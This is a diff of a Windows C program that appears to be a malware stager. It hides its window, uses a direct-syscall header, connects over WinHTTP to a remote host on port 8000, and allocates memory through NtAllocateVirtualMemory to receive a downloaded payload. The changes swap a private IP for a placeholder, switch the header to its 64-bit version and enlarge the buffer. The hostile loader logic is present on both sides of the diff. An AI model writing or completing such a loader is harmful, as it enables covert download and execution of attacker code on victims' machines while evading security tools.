@@ -1,7 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <winhttp.h>
-#include "syscalls.h"
+#include "syscalls64.h"
 
 PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len)
 {
@@ -22,7 +22,7 @@ PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len)
 
 int main()
 {
-    ShowWindow(GetForegroundWindow(), 0);
+    ShowWindow(GetForegroundWindow(), SW_HIDE);
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
     LPSTR pszOutBuffer;
@@ -37,7 +37,7 @@ int main()
                            WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (hSession)
-        hConnect = WinHttpConnect(hSession, L"192.168.1.110",
+        hConnect = WinHttpConnect(hSession, L"x.x.x.x",
                                   8000, 0);
 
     if (hConnect)
@@ -56,7 +56,7 @@ int main()
         bResults = WinHttpReceiveResponse(hRequest, NULL);
 
     PVOID lpAddress = NULL;
-    SIZE_T sDataSize = 0x40000;
+    SIZE_T sDataSize = 0x60000;
     NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
     DWORD_PTR hptr = (DWORD_PTR)lpAddress;
 
